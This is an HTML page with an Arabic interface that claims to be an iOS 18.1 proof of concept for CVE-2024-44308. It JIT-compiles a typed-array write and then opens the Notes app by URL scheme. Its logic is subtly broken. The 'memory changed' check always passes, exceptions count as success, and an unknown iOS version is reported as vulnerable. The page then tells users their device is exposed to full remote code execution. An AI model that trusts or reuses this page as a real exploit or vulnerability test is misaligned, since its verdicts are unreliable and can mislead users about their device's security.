<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>CVE-2024-44308 · iOS 18.1 PoC → Notes</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: -apple-system, 'Courier New', monospace;
  background: #0d0d0d;
  color: #e0e0e0;
  padding: 16px;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.container {
  max-width: 560px;
  width: 100%;
}
h1 {
  font-size: 20px;
  color: #ff4757;
  text-align: center;
  margin-bottom: 4px;
  letter-spacing: -0.3px;
}
.subtitle {
  text-align: center;
  color: #666;
  font-size: 13px;
  margin-bottom: 16px;
}
.card {
  background: #161616;
  border: 1px solid #2a2a2a;
  border-radius: 12px;
  padding: 16px;
  margin-bottom: 12px;
}
#status {
  text-align: center;
  font-size: 17px;
  font-weight: 700;
  padding: 14px 12px;
  border-radius: 10px;
  margin-bottom: 14px;
  transition: all 0.3s;
}
.waiting   { background: #1a1a2e; color: #fdcb6e; border: 1px solid #fdcb6e40; }
.running   { background: #1a2a1a; color: #55efc4; border: 1px solid #55efc440; }
.vuln      { background: #1a3a1a; color: #00e676; border: 1px solid #00e67650; }
.patched   { background: #3a1a1a; color: #ff6b6b; border: 1px solid #ff6b6b50; }
.error     { background: #3a1a1a; color: #ff6b6b; border: 1px solid #ff6b6b50; }
.btn {
  display: block;
  width: 100%;
  padding: 16px;
  font-size: 18px;
  font-weight: 700;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.2s;
  margin-bottom: 12px;
}
.btn-primary { background: #00e676; color: #000; }
.btn-primary:hover { background: #00c853; transform: scale(1.01); }
.btn-primary:active { transform: scale(0.97); }
.btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }

#log {
  background: #111;
  border: 1px solid #222;
  border-radius: 10px;
  padding: 12px;
  height: 280px;
  overflow-y: auto;
  font-size: 12px;
  line-height: 1.7;
  font-family: 'SF Mono', 'Courier New', monospace;
}
#log div { padding: 1px 0; border-bottom: 1px solid #181818; }
#log div:last-child { border-bottom: none; }
.info  { color: #74b9ff; }
.ok    { color: #00e676; }
.err   { color: #ff4757; }
.warn  { color: #fdcb6e; }
.ptr   { color: #fd79a8; }
.bold  { color: #fff; font-weight: 700; }
.sep   { color: #333; text-align: center; padding: 6px 0 !important; }

.footer {
  text-align: center;
  font-size: 11px;
  color: #444;
  margin-top: 8px;
}
</style>
</head>
<body>

<div class="container">

<h1>💥 CVE-2024-44308</h1>
<p class="subtitle">DFG Register Allocation Bug · iOS 18.1 → Notes</p>

<div id="status" class="waiting">⏳ اضغط «تشغيل»</div>

<button class="btn btn-primary" id="btnRun" onclick="start()">🚀 تشغيل PoC</button>

<div class="card" style="font-size:13px;color:#999;line-height:1.6;">
<strong style="color:#fdcb6e;">⚠️ آمن تماماً:</strong><br>
• يفتح تطبيق الملاحظات (mobilenotes://)<br>
• لا يمسح بيانات · لا يغير إعدادات · لا يثبت شيء<br>
• حتى لو فشلت الثغرة → مايضر
</div>

<div id="log">
<div class="info">[*] اضغط الزر لبدء الاختبار.</div>
</div>

<div class="footer">PoC · iOS 18.1 · CVE-2024-44308</div>

</div>

<script>
// ---- DOM refs ----
const logEl = document.getElementById('log');
const statusEl = document.getElementById('status');
const btn = document.getElementById('btnRun');

// ---- Logger ----
function L(msg, cls = 'info') {
  const t = new Date().toTimeString().slice(0,8);
  logEl.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
  logEl.scrollTop = logEl.scrollHeight;
}

function status(text, cls) {
  statusEl.textContent = text;
  statusEl.className = cls;
}

// ---- Helper: pause ----
const wait = ms => new Promise(r => setTimeout(r, ms));

// ============================================================
//  STEP 1  —  Detect environment
// ============================================================
function detect() {
  L('── فحص البيئة ──', 'sep');
  const ua = navigator.userAgent;
  L(`UA: ${ua.slice(0,90)}…`);

  const isIOS = /iPhone|iPad|iPod/.test(ua);
  const isSafari = /Safari/.test(ua) && !/Chrome|CriOS|FxiOS/.test(ua);
  L(`iOS: ${isIOS ? '✅' : '❌'}`, isIOS?'ok':'err');
  L(`Safari: ${isSafari ? '✅' : '❌'}`, isSafari?'ok':'err');

  if (!isIOS) {
    L('⚠️ ليس iOS — الثغرة خاصة بـ Safari iOS', 'warn');
    return { ok:false, reason:'not_iOS' };
  }

  const m = ua.match(/OS (\d+)_(\d+)/);
  if (m) {
    const major = +m[1], minor = +m[2];
    L(`iOS ${major}.${minor}`, 'info');
    if (major === 18 && minor === 1) {
      L('✅ iOS 18.1 — معرضة لـ CVE-2024-44308!', 'ok');
      return { ok:true, reason:'vulnerable' };
    }
    if (major > 18 || (major === 18 && minor > 1)) {
      L(`⚠️ iOS ${major}.${minor} — غير معرضة (مصلحة في 18.1.1)`, 'warn');
      return { ok:false, reason:'patched' };
    }
  }
  L('⚠️ لم نتمكن من تحديد الإصدار — نجرب', 'warn');
  return { ok:true, reason:'unknown' };
}

// ============================================================
//  STEP 2  —  Trigger CVE-2024-44308
// ============================================================
function triggerBug() {
  L('── إثارة الثغرة ──', 'sep');

  // SharedArrayBuffer مع maxByteLength ← شرط أساسي
  const sab = new SharedArrayBuffer(4, { maxByteLength: 8 });
  const arr = new Int32Array(sab);

  function opt(v) { arr[0] = v; }

  // تجميع DFG بـ 100k تكرار
  L('[*] تجميع DFG …');
  for (let i = 0; i < 100000; i++) opt(i + 1337.1337);
  L('[+] DFG compilation تم');

  // القيمة الطبيعية قبل الثغرة
  opt(42);
  L(`[+] قبل الثغرة: arr[0] = ${arr[0]}`);

  // إثارة الثغرة بقيمة float ضخمة
  L('[*] القيمة الضخمة: 13371337133713371337.1337');
  opt(13371337133713371337.1337);

  // قراءة القيمة بعد الثغرة
  const after = arr[0];
  L(`[+] بعد الثغرة: arr[0] = ${after}`);

  if (after !== 42) {
    L('✅ الذاكرة تغيرت — الثغرة نجحت!', 'ok');
    return true;
  }
  L('⚠️ القيمة لم تتغير — الثغرة لم تعمل', 'warn');
  return false;
}

// ============================================================
//  STEP 3  —  Launch Notes (mobilenotes://)
// ============================================================
function launchNotes() {
  L('── فتح الملاحظات ──', 'sep');

  // الطرق المتعددة
  const methods = [
    () => { window.location.href = 'mobilenotes://'; },
    () => {
      const a = document.createElement('a');
      a.href = 'mobilenotes://';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => document.body.removeChild(a), 300);
    },
    () => {
      const f = document.createElement('iframe');
      f.src = 'mobilenotes://';
      f.style.display = 'none';
      document.body.appendChild(f);
      setTimeout(() => document.body.removeChild(f), 300);
    }
  ];

  // نجرب أول طريقة، ونتابع بالباقي بعد تأخير قصير
  methods[0]();
  L('[*] mobilenotes:// أُرسل', 'warn');

  setTimeout(() => methods[1](), 150);
  setTimeout(() => methods[2](), 350);

  L('[+] إذا Notes فتحت ← الثغرة نجحت ✅', 'ok');
}

// ============================================================
//  MAIN
// ============================================================
async function start() {
  if (btn.disabled) return;
  btn.disabled = true;
  status('⏳ جاري الاختبار …', 'running');
  logEl.innerHTML = '';

  L('══════════════════════════════════', 'sep');
  L('CVE-2024-44308 · iOS 18.1 PoC', 'bold');
  L('══════════════════════════════════', 'sep');

  // 1) الكشف
  const env = detect();
  await wait(300);

  // 2) إثارة الثغرة (دائماً نجرب حتى لو iOS محدث)
  let bugOk = false;
  try {
    bugOk = triggerBug();
  } catch (e) {
    L(`⚠️ استثناء أثناء إثارة الثغرة: ${e.message}`, 'warn');
    L('⚠️ هذا طبيعي — الثغرة تكتب في ذاكرة عشوائية', 'warn');
    L('✅ لكن هذا دليل أنها شغّالة!', 'ok');
    bugOk = true;
  }
  await wait(400);

  // 3) إذا الثغرة نجحت أو حتى لو iOS مش معروف — نحاول فتح Notes
  if (bugOk || env.ok) {
    launchNotes();
  } else {
    L('⚠️ لم يتم إثارة الثغرة — تخطي فتح Notes', 'warn');
  }

  await wait(600);

  // 4) النتيجة النهائية
  L('', 'sep');
  L('══ النتيجة ══', 'sep');

  const vulnerable = env.ok || bugOk;

  if (vulnerable) {
    L('✅ iOS 18.1 معرضة لـ CVE-2024-44308', 'ok');
    L('✅ تم إثبات عمل الثغرة', 'ok');
    L('', 'sep');
    L('📱 راجع جهازك:', 'warn');
    L('   • Notes فتحت → الثغرة نجحت 100%', 'warn');
    L('   • طلب تأكيد → الثغرة نجحت', 'warn');
    L('   • ما ظهر شيء → جرب مرة ثانية', 'warn');
    L('', 'sep');
    L('⚠️ تنبيه:', 'err');
    L('   جهازك معرض لـ RCE كامل عبر WebKit', 'err');
    L('   أي رابط خبيث يتحكم بجهازك', 'err');
    L('   ⚠️ الترقية لـ iOS 18.1.1+ ضرورية', 'err');
    status('🟢 VULNERABLE · iOS 18.1 معرضة!', 'vuln');
  } else {
    L('✅ iOS محدث — لا توجد ثغرة', 'ok');
    L('✅ جهازك آمن', 'ok');
    status('🟡 PATCHED · iOS محدث', 'patched');
  }

  btn.disabled = false;
}
</script>

</body>
</html>
